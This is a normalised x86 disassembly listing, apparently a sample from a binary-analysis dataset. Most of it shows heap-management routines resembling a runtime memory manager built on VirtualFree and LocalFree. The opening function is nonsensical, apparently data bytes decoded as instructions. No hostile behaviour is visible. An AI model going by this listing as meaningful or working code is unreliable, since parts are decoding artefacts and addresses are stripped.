sub_4010ac
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi ] al
mov eax eax
rcl [ eax ] 0x40
add [ edx ] cl
push es
push ebx
je r-xdata
add al 0xf8
jmp sub_405830
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 2 + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi + 0x11 ] si
inc eax
add [ eax ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
fcom [ bx + si ]
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
inc esp
and al 0x4
clc
jmp sub_405808
insd
add [ eax ] al
pushad
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
push esp
dec edi
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop es
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x11
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
sub_4013e8
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_4013a8
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401440
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013e8
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401488
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401470
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401470
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401440
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401440
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401470
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40158c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401440
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_4013b8
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_4013b8
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_4013b8
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401440
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401668
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401470
mov [ rw-data ] 0x1
sub_401720
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_4013b8
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_4017b4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_401834
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40158c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_401720
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401488
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401668
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401470
jmp r-xdata
sub_4018c4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015f0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401488
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015f0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401668
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401488
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_401720
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401668
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401470
jmp r-xdata
sub_4019e8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_4017b4
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401488
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401668
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014f8
jmp r-xdata
sub_401a74
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b2a
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_4013c8
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_401438
mov eax rw-data
call sub_401438
mov eax rw-data
call sub_401438
push 0xff8
push 0x0
call sub_4013a8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_4013d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b31
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_4013d8
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401b38
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c0e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_4013d0
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_401438
mov eax rw-data
call sub_401438
mov eax rw-data
call sub_401438
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_4013e0
retn
push rw-data
call sub_4013d8
sub_401c18
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c7c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401cac
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e80
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d00
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401cdc
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d28
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c18
add ebx esi
mov [ rw-data ] 0x6
sub_401d98
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c18
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401dd0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c7c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019e8
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019e8
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401cac
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014f8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d00
sub_401e80
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401dd0
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f08
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401cdc
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f54
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f08
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401488
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d28
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d98
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401cac
sub [ edi + 0x4 ] 0x4
sub_401fe0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_401834
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f54
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_40200c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4018c4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f54
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402040
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40206c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c18
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e80
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401fe0
test al al
jne r-xdata
mov eax esi
call sub_402040
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a74
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_4022dc
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_4013d0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40206c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_4013d8
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403984
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403984
jmp r-xdata
sub_4022f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402482
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a74
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_4013d0
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_4013d8
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403984
jmp r-xdata
call sub_401f08
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c18
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e80
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c18
sub_402494
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
